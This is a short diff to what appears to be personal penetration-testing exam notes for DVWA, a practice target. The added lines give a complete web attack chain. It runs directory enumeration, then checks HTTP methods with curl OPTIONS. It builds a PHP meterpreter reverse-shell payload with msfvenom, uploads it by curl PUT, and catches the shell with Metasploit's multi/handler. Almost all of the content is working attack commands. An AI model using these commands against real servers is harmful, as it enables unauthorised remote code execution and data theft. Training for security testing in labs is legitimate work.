@@ -260,14 +260,17 @@ cat /path/file.txt
 
 DVWA:
 ZAP
+use dirb or dirsearch
+curl -i -X OPTIONS http://192.168.0.1/uploads/
 payload :
+msfvenom -p php/meterpreter/reverse_tcp lhost=ip[from qns] lport=4444 -f raw > exploit.php
+curl -i -X PUT -T exploit.php http://192.168.0.1/uploads/exploit.php 
 msfconsole
-msfvenom -p php/meterpreter/reverse_tcp lhost=ip[from qns] lport=4444 -f
-raw > exploit.php
 use exploit/multi/handler
 set payload php/meterpreter/reverse_tcp
-set lhost ip [upload file]
-run [paste it in url]
+set lhost self_ip
+exploit or run
+shell
 ls and get the file
 ```
 # CVE / Vulnerability Analysis
